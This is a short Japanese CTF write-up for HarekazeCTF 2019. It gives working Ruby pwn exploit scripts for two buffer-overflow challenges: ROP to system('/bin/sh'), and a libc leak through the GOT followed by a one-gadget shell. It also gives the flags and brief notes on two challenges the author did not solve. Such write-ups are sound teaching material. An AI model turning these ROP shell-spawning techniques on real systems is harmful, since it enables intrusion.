---
title: "HarekazeCTF 2019 writeup"
date: 2019-05-19T16:54:53+09:00
draft: false
categories: 
- writeup

---

## Baby ROP 1

- バイナリ中で、`system` 関数使ってechoしており、Canary等もないBOFが起こるので、`pop rdi; ret` 使って`system(/bin/sh)` を呼ぶだけ

```ruby
#!/usr/bin/env ruby

require 'pwn'

context.log_level = :debug
z = Sock.new "problem.harekaze.com", 20001

pop_rdi_ret = p64(0x00400683)
system = p64(0x4005e3)

STDIN.gets
z.recvuntil "? "
payload = "A" * 24
payload << pop_rdi_ret
payload << p64(0x601048)
payload << system

z.sendline payload

z.interact
```

- **HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}**

## Baby ROP 2

- `system` 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ

```ruby
#!/usr/bin/env ruby

require 'pwn'

context.log_level = :debug
z = Sock.new "problem.harekaze.com", 20005
#z = Sock.new "localhost", 9999
elf = ELF.new "./babyrop2"
libc = ELF.new "./libc.so.6"
#libc = ELF.new "./mylibc.so.6"

pop_rdi_ret = p64(0x00400733)
z.recvuntil "? "

payload = "A" * 40
payload << pop_rdi_ret
payload << p64(elf.got["__libc_start_main"])
payload << p64(0x4004f0)
payload << p64(elf.symbols["main"])
STDIN.gets
z.sendline payload

recvlen = "Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n".length
data = z.recvuntil "? "
p data
libc_base = u64(data[recvlen, 6].ljust(8, "\x00")) - libc.symbols["__libc_start_main"]
libc_magic = libc_base + 0xf02a4
puts "libc base 0x%x" % libc_base
puts "libc magic 0x%x" % libc_magic

payload = "B" * 40
payload << p64(libc_magic)
z.sendline payload

z.interact
```

- **HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}**

## Login

- 解けなかった、脆弱性わからず

## Harekaze Note

- Note の削除時に何も考慮してないため、Heapアドレスのリークやdouble freeができるが、そこから攻撃に繋げられず
